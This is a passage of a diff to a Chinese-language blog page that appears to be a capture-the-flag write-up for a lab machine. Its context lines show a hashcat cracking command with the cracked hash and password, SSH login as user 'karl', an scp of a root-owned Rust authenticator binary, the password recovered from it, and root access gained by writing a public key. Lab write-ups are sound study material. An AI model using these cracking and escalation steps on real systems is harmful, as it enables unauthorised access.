'HOST': 'localhost',</span><br><span class="line">        'PORT': '',</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -325,17 +418,45 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo hashcat -m 10000 hash.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">pbkdf2_sha256$</span><span class="bash">12000<span class="variable">$wP0L4ePlxSjD</span><span class="variable">$TTeyAB7uJ9uQprnr</span>+mgRb8ZL8othIs32aGmqahx1rGI=:insaneclownposse</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>破解出来的密码就是karl的ssh密码，ssh登录得到user.txt:</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011814.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011814.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="rust逆向-amp-root-flag"><a href="#rust逆向-amp-root-flag" class="headerlink" title="rust逆向 &amp; root flag"></a>rust逆向 &amp; root flag</h1><p>可以sudo运行一个elf，查看strings可以知道是rust：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011815.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011815.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp karl@10.10.11.103://root/.auth/authenticator .</span><br></pre></td></tr></table></figure>
 
 <p>经过一系列逆向分析得到密码：<code>RustForSecurity@Developer@2021:)</code></p>
 <p>(分析过程直接看0xdf文章和ippsec视频吧)</p>
 <p>验证通过后可以写公钥：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011816.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011816.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p>然后ssh登录root，读取root.txt:</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011817.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011817.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><a href="https://github.com/studoot/ps2exe" target="_blank" rel="noopener">https://github.com/studoot/ps2exe</a></li>
 <li><a href="https://github.com/buuren/powershell/blob/master/misc/encryptPassword.ps1" target="_blank" rel="noopener">https://github.com/buuren/powershell/blob/master/misc/encryptPassword.ps1</a></li>
